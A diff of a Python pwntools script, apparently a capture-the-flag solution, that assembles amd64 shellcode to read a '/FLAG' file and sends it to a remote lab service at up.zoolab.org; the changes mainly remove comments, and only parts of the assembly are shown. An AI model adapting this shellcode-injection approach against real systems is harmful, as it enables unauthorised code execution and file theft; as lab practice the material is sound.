@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-from pwn import * # Imports asm, context, remote, log, etc.
+from pwn import *
 import sys
 
-# 1. Set the architecture context
+
 context.arch = 'amd64'
-context.os = 'linux' # Good practice, though asm mainly relies on arch
+context.os = 'linux'
 
 port = 12341
 host = 'up.zoolab.org'
@@ -17,7 +17,6 @@ if 'local' in sys.argv[1:]:
 else:
     r = remote(host, port)
 
-# 2. Write your assembly code as a Python multi-line string
 assembly_code = """
 jmp short string_data_marker
 
@@ -52,10 +51,9 @@ string_data_marker:
     .asciz "/FLAG"
 """
 
-# 3. Assemble the code using asm()
+# Assemble the code using asm()
 shellcode_bytes = asm(assembly_code)
 
-# Wait for the server's prompt
 prompt = r.recvuntil(b"Enter your code> ")
 log.info(f"Received prompt: {prompt.decode(errors='ignore').strip()}")
 
